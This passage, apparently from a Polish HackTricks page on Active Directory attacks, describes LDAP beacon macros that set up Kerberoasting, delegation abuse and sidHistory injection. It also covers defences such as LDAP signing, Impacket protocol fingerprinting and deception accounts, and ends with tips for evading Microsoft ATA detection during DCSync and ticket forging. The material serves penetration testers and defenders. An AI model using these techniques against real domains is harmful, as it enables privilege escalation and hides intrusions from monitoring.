- `add-spn`/`set-spn` natychmiast sprawiają, że przejęty użytkownik staje się podatny na Kerberoasting; `add-asreproastable` (przełącznik UAC) oznacza go jako podatnego na AS-REP roasting bez modyfikowania hasła.
- Makra delegacji (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) przepisują `msDS-AllowedToDelegateTo`, flagi UAC lub `msDS-AllowedToActOnBehalfOfOtherIdentity` z beaconu, umożliwiając ścieżki ataku constrained/unconstrained/RBCD i eliminując potrzebę używania zdalnego PowerShell lub RSAT.

### Wstrzykiwanie sidHistory, relokacja OU i kształtowanie powierzchni ataku

- `add-sidhistory` wstrzykuje uprzywilejowane SID-y do historii SID kontrolowanego principal (zobacz [SID-History Injection](sid-history-injection.md)), zapewniając uzyskiwanie dziedziczonego dostępu w sposób ukryty, w całości przez LDAP/LDAPS.
- `move-object` zmienia DN/OU komputerów lub użytkowników, umożliwiając atakującemu przeciągnięcie zasobów do OU, w których już istnieją delegowane uprawnienia, przed użyciem `set-password`, `add-groupmember` lub `add-spn`.
- Ściśle ograniczone polecenia usuwania (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember` itd.) umożliwiają szybki rollback po zebraniu przez operatora poświadczeń lub persistence, minimalizując telemetry.

## AD -> Azure i Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Kilka ogólnych zabezpieczeń

[**Dowiedz się tutaj więcej o ochronie poświadczeń.**](../stealing-credentials/credentials-protections.md)

### **Środki ochrony poświadczeń**

- **Ograniczenia dla Domain Admins**: Zaleca się, aby Domain Admins mogli logować się wyłącznie do Domain Controllers, co pozwala uniknąć ich używania na innych hostach.
- **Uprawnienia kont usług**: Usługi nie powinny działać z uprawnieniami Domain Admin (DA), aby zachować bezpieczeństwo.
- **Czasowe ograniczenie uprawnień**: W przypadku zadań wymagających uprawnień DA czas ich obowiązywania powinien być ograniczony. Można to osiągnąć za pomocą: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **Ograniczanie LDAP relay**: Audytuj identyfikatory zdarzeń 2889/3074/3075, a następnie wymuś podpisywanie LDAP oraz channel binding LDAPS na DC/klientach, aby blokować próby LDAP MITM/relay.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Fingerprinting aktywności Impacket na poziomie protokołu

Jeśli chcesz wykrywać typowe tradecraft AD, **nie polegaj wyłącznie na artefaktach kontrolowanych przez operatora**, takich jak zmienione nazwy plików binarnych, nazwy usług, tymczasowe pliki batch lub ścieżki wyjściowe. Ustal baseline tego, jak legalne klienty Windows generują ruch [Kerberos](kerberos-authentication.md), [NTLM](../ntlm/README.md), SMB, LDAP, DCE/RPC i WMI, a następnie szukaj **cech implementacyjnych**, które pozostają nawet po zmodyfikowaniu przez operatora plików `psexec.py`, `wmiexec.py`, `dcomexec.py`, `atexec.py` lub `ntlmrelayx.py`.<sup>[[8]](#references)</sup>

- **Kandydaci o wysokiej wiarygodności jako samodzielne sygnały** (po zweryfikowaniu względem własnego baseline):
- Uwierzytelnione DCE/RPC z użyciem `auth_context_id = 79231 + ctx_id`
- Padding uwierzytelniania DCE/RPC wypełniony wartością `0xff`
- Bindowania LDAP Kerberos, które umieszczają surowy Kerberos `AP-REQ` bezpośrednio w `mechToken` SPNEGO
- Żądania negotiate SMB2/3 z wartościami `ClientGuid` wyglądającymi jak ASCII
- WMI `IWbemLevel1Login::NTLMLogin` korzystające z niestandardowej przestrzeni nazw `//./root/cimv2`
- Zakodowane na stałe wartości nonce Kerberos
- **Lepsze jako cechy korelacji/scoringu**:
- Rzadkie lub zduplikowane listy etype Kerberos, nietypowe/brakujące `PA-DATA` albo kolejność etype w TGS-REQ różniąca się od natywnego Windows
- Wiadomości NTLM Type 1 bez informacji o wersji lub wiadomości Type 3 z pustymi nazwami hostów
- Surowy NTLMSSP przenoszony w DCE/RPC zamiast SPNEGO, brak trailerów weryfikacyjnych DCE/RPC albo niezgodności OID SPNEGO/Kerberos
- Kilka takich cech pochodzących z tego samego hosta/użytkownika/sesji/przedziału czasowego jest znacznie silniejszym sygnałem niż dowolne pojedyncze, słabe pole
- **Używaj jako wzbogacenia, a nie samodzielnych alertów**:
- Domyślne nazwy plików, ścieżki wyjściowe, losowe nazwy usług, tymczasowe nazwy batch, domyślne nazwy kont komputerów oraz charakterystyczne dla narzędzi ciągi HTTP/WebDAV/RDP/MSSQL
- Operatorzy mogą łatwo je zmienić, dlatego najlepiej wykorzystywać je do wyjaśnienia, dlaczego klaster cross-protocol jest podejrzany
- **Uwagi operacyjne**:
- Niektóre z tych sygnałów wymagają odszyfrowanego ruchu, [parsowania PCAP/Zeek](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md), ETW lub widoczności po stronie usług
- Przed przekształceniem ich w alerty zweryfikuj je względem klientów Samba/Linux, urządzeń oraz starszego oprogramowania
- W miarę uzyskiwania pewności co do baseline rozwijaj detekcje od wzbogacenia -> threat huntingu -> alertowania

### **Implementowanie technik Deception**

- Implementowanie deception polega na zastawianiu pułapek, takich jak użytkownicy lub komputery-przynęty, z cechami takimi jak hasła, które nie wygasają, lub oznaczenie jako Trusted for Delegation. Szczegółowe podejście obejmuje tworzenie użytkowników z określonymi prawami lub dodawanie ich do grup o wysokich uprawnieniach.<sup>[[2]](#references)</sup>
- Praktyczny przykład obejmuje użycie narzędzi takich jak: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Więcej informacji o wdrażaniu technik deception można znaleźć na stronie [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Wykrywanie Deception**

- **Dla obiektów użytkowników**: Podejrzane wskaźniki obejmują nietypowy ObjectSID, rzadkie logowania, daty utworzenia oraz niską liczbę nieudanych prób podania hasła.
- **Wskaźniki ogólne**: Porównanie atrybutów potencjalnych obiektów-przynęt z atrybutami prawdziwych obiektów może ujawnić niespójności. Narzędzia takie jak [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) mogą pomóc w wykrywaniu takich deception.

### **Omijanie systemów detekcji**

- **Omijanie detekcji Microsoft ATA**:
- **Enumeracja użytkowników**: Unikanie enumeracji sesji na Domain Controllers w celu zapobiegania detekcji ATA.
- **Impersonacja ticketów**: Używanie kluczy **aes** do tworzenia ticketów pomaga ominąć detekcję, ponieważ nie powoduje downgrade'u do NTLM.
- **Ataki DCSync**: Zaleca się wykonywanie ich z systemu niebędącego Domain Controllerem w celu uniknięcia detekcji ATA, ponieważ bezpośrednie wykonanie z Domain Controllera wywoła alerty.

## References

- [1] [Przewodnik po atakowaniu zaufania domen](https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/)
- [2] [Fałszowanie zaufania na potrzeby Deception w Active Directory](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [3] [Od Domain Admin do Enterprise Admin](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [4] [Kolekcja LDAP BOF – narzędzie LDAP działające w pamięci do eksploatacji Active Directory](https://github.com/P0142/LDAP-Bof-Collection)
- [5] [TrustedSec – Holy Shuck! Wykorzystanie hashy NTLM jako wordlisty](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [6] [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [7] [Hashcat](https://github.com/hashcat/hashcat)
- [8] [ThatTotallyRealMyth/Impacket-IoCs – Analiza Impacket](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)
- [9] [rub-softsec/onelogon - Onelogon: Przejmowanie kont Active Directory za pośrednictwem Netlogon](https://github.com/rub-softsec/onelogon)
- [10] [Microsoft - Jak zarządzać zmianami w bezpiecznych połączeniach kanału Netlogon związanymi z CVE-2020-1472](https://support.microsoft.com/en-us/topic/how-to-manage-the-changes-in-netlogon-secure-channel-connections-associated-with-cve-2020-1472-f7e8cc17-0309-1d6a-304e-5ba73cd1a11e)
- [11] [Podróż do zapomnianych interfejsów Null Session i MS-RPC](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
- [12] [Czy filtr SID stanowi granicę bezpieczeństwa między domenami? (Część 4) - Badanie omijania filtrowania SID](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
- [13] [Czy filtr SID stanowi granicę bezpieczeństwa między domenami? (Część 5) - Atak Golden GMSA trust - od domeny podrzędnej do nadrzędnej](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5)
- [14] [Czy filtr SID stanowi granicę bezpieczeństwa między domenami? (Część 6) - Atak Schema change trust - od domeny podrzędnej do nadrzędnej](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6)
- [15] [Od DA do EA za pomocą ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/)
- [16] [Eskalacja od administratorów domeny podrzędnej do administratorów przedsiębiorstwa w 5 minut przez nadużycie AD CS — ciąg dalszy](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)
- [17] [ACE w rękawie: projektowanie backdoorów DACL w Active Directory](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)
{{#include ../../banners/hacktricks-training.md}}
